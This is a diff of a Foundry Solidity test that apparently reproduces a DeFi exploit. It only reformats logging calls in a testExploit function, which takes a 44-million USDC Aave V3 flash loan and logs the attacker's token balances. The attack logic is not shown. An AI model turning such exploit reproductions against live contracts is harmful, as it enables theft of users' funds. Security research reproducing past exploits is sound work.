@@ -79,27 +79,25 @@ contract ContractTest is Test {
     function testExploit() external {
         aaveV3.flashLoanSimple(address(this), address(USDC), 44_000_000 * 1e6, new bytes(0), 0);
 
-        emit log_named_decimal_uint(
-            "Attacker USP balance after exploit", USP.balanceOf(address(this)), USP.decimals()
-            );
+        emit log_named_decimal_uint("Attacker USP balance after exploit", USP.balanceOf(address(this)), USP.decimals());
         emit log_named_decimal_uint(
             "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
-            );
+        );
         emit log_named_decimal_uint(
             "Attacker USDC_E balance after exploit", USDC_E.balanceOf(address(this)), USDC_E.decimals()
-            );
+        );
         emit log_named_decimal_uint(
             "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
-            );
+        );
         emit log_named_decimal_uint(
             "Attacker USDT_E balance after exploit", USDT_E.balanceOf(address(this)), USDT_E.decimals()
-            );
+        );
         emit log_named_decimal_uint(
             "Attacker BUSD balance after exploit", BUSD.balanceOf(address(this)), BUSD.decimals()
-            );
+        );
         emit log_named_decimal_uint(
             "Attacker DAI_E balance after exploit", DAI_E.balanceOf(address(this)), DAI_E.decimals()
-            );
+        );
     }
 
     function executeOperation(
